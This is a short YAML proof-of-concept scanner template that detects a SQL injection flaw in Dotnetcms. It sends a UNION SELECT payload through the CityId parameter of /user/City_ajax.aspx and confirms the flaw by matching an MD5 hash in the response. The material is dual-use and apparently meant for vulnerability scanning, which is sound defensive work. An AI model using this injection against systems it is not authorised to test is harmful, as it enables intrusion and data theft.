id: poc-yaml-dotnetcms-sqli
info:
  name: Dotnetcms SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: Dotnetcms
  reference: []
  description: null
variables:
  r1: random_int(10000, 21000)
  r2: random_int(1, 100)
transport: http
requests:
- method: GET
  path: /user/City_ajax.aspx
  headers: {}
  data: null
  redirect: false
  raw: null
  timeout: null
  expression: status_code == 200
  output: []
- method: GET
  path: /user/City_ajax.aspx?CityId={{.r2}}'union%20select%20sys.fn_sqlvarbasetostr(HashBytes('MD5','{{.r1}}')),2--
  headers: {}
  data: null
  redirect: false
  raw: null
  timeout: null
  expression: status_code == 200 && contains(body, md5(r1))
  output: []
